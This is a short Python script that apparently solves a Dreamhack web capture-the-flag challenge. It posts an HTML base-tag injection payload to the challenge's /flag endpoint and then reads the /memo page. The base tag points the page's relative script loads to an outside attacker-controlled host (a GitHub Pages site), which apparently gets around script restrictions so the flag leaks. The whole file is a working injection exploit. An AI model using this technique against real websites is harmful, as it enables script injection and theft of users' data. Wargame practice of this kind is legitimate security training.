import requests

port = 12263
url_index = f"http://host3.dreamhack.games:{port}/"
url_flag = url_index + "flag"
url_memo = url_index + "memo"

param = {"param": "<base href='https://hibrian827.github.io'>"}

r = requests.post(url_flag, data=param)
r = requests.get(url_memo)
print(r.text)
